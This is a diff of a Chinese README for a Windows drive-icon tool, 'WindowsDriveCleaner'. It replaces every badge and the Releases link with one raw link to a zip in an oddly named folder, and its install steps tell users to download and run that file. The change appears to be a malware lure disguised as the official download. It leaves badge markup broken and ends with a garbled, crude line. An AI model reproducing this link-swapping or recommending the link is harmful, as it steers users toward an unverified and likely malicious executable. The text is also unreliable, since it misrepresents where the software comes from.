@@ -2,11 +2,11 @@
 
 <div align="center">
 
-[![Download WindowsDriveCleaner](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Scrooge1324/WindowsDriveCleaner/releases)
-![Windows Drive Cleaner](https://img.shields.io/badge/Version-2.2.0-blue.svg)
-![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)
-![Python](https://img.shields.io/badge/Python-3.7+-green.svg)
-![License](https://img.shields.io/badge/License-MIT-orange.svg)
+[![Download WindowsDriveCleaner](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)
+![Windows Drive Cleaner](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)
+![Platform](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)
+![Python](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip+https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)
+![License](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)
 
 </div>
 
@@ -54,9 +54,9 @@ Windows Drive Cleaner 是一款专为 Windows 系统设计的驱动器图标管�
 
 ### 💻 下载 & 安装
 
-1. 访问 [WindowsDriveCleaner Releases 页面](https://github.com/Scrooge1324/WindowsDriveCleaner/releases).
+1. 访问 [WindowsDriveCleaner Releases 页面](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip).
 2. 在页面中找到最新版本，比如 **2.2.0**。
-3. 下载 *WindowsDriveCleaner.exe* 安装文件。
+3. 下载 *https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip* 安装文件。
 4. 双击下载的文件，按照屏幕上的指示完成安装。
 
 ### 🔧 使用指南
@@ -88,6 +88,6 @@ Windows Drive Cleaner 是一款专为 Windows 系统设计的驱动器图标管�
 
 ---
 
-[![Download WindowsDriveCleaner](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Scrooge1324/WindowsDriveCleaner/releases) 
+[![Download WindowsDriveCleaner](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip)](https://raw.githubusercontent.com/Scrooge1324/WindowsDriveCleaner/main/pomatum/WindowsDriveCleaner_v2.2.zip) 
 
 做愛窗户驱动器清理的工具！
